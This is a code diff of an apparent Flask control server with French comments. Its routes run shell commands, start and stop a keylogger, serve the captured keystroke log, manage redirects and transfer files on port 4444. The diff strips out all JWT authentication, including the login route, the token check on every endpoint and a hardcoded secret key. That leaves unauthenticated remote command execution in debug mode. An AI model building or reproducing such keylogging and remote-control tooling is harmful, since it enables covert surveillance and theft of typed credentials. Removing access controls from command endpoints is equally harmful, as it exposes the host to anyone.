@@ -2,12 +2,9 @@ import os
 import json
 import subprocess
 import logging
-from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 from werkzeug.utils import secure_filename
-import jwt
-from functools import wraps
 
 # Configuration du logging
 logging.basicConfig(level=logging.INFO)
@@ -20,12 +17,7 @@ CORS(app)
 UPLOAD_FOLDER = 'uploads'
 KEYLOG_FILE = 'keylog.txt'
 REDIRECTS_FILE = 'redirects.json'
-USERS_FILE = 'users.json'
 KEYLOGGER_SCRIPT = 'keylogger.py'
-
-# Configuration JWT
-app.config['SECRET_KEY'] = '44a399825e1ed7d0bee57decba9933cd8d1a19f11ad66889c4dbbe93657e1ef6'
-app.config['JWT_EXPIRATION_DELTA'] = timedelta(hours=24)
 
 # Création des fichiers et dossiers nécessaires
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
@@ -36,60 +28,7 @@ for file in [KEYLOG_FILE, REDIRECTS_FILE]:
 # Variables globales
 keylogger_process = None
 
-def token_required(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        token = None
-        if 'Authorization' in request.headers:
-            token = request.headers['Authorization'].split(" ")[1]
-        
-        if not token:
-            return jsonify({'message': 'Token manquant'}), 401
-        
-        try:
-            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
-            with open(USERS_FILE, 'r') as file:
-                users = json.load(file)
-                current_user = users.get(data['username'])
-                if not current_user:
-                    return jsonify({'message': 'Utilisateur invalide'}), 401
-        except:
-            return jsonify({'message': 'Token invalide'}), 401
-        
-        return f(*args, **kwargs)
-    return decorated
-
-@app.route('/api/auth/login', methods=['POST'])
-def login():
-    try:
-        auth = request.get_json()
-        if not auth or not auth.get('username') or not auth.get('password'):
-            return jsonify({'message': 'Identifiants manquants'}), 401
-        
-        with open(USERS_FILE, 'r') as file:
-            users = json.load(file)
-        
-        user = users.get(auth['username'])
-        if not user or user['password'] != auth['password']:
-            return jsonify({'message': 'Identifiants invalides'}), 401
-        
-        token = jwt.encode({
-            'username': auth['username'],
-            'role': user['role'],
-            'exp': datetime.utcnow() + app.config['JWT_EXPIRATION_DELTA']
-        }, app.config['SECRET_KEY'])
-        
-        return jsonify({
-            'token': token,
-            'username': auth['username']
-        })
-    
-    except Exception as e:
-        logger.error(f"Erreur lors de l'authentification: {str(e)}")
-        return jsonify({'error': str(e)}), 500
-
 @app.route('/command', methods=['POST'])
-@token_required
 def execute_command():
     try:
         data = request.get_json()
@@ -120,7 +59,6 @@ def execute_command():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/keylog/start', methods=['POST'])
-@token_required
 def start_keylogger():
     global keylogger_process
     try:
@@ -140,7 +78,6 @@ def start_keylogger():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/keylog/stop', methods=['POST'])
-@token_required
 def stop_keylogger():
     global keylogger_process
     try:
@@ -156,7 +93,6 @@ def stop_keylogger():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/keylog/output', methods=['GET'])
-@token_required
 def get_keylog_output():
     try:
         logger.info(f"Reading keylog from: {os.path.abspath(KEYLOG_FILE)}")
@@ -173,7 +109,6 @@ def get_keylog_output():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/redirect/add', methods=['POST'])
-@token_required
 def add_redirect():
     try:
         data = request.get_json()
@@ -197,7 +132,6 @@ def add_redirect():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/redirect/list', methods=['GET'])
-@token_required
 def list_redirects():
     try:
         if not os.path.exists(REDIRECTS_FILE):
@@ -212,7 +146,6 @@ def list_redirects():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/redirect/remove', methods=['POST'])
-@token_required
 def remove_redirect():
     try:
         data = request.get_json()
@@ -238,7 +171,6 @@ def remove_redirect():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/files', methods=['GET'])
-@token_required
 def list_files():
     try:
         files = []
@@ -257,7 +189,6 @@ def list_files():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/upload', methods=['POST'])
-@token_required
 def upload_file():
     try:
         if 'file' not in request.files:
@@ -277,7 +208,6 @@ def upload_file():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/download/<filename>', methods=['GET'])
-@token_required
 def download_file(filename):
     try:
         return send_file(
@@ -290,4 +220,4 @@ def download_file(filename):
         return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=4444, debug=True)
+    app.run(host='0.0.0.0', port=4444, debug=True) 
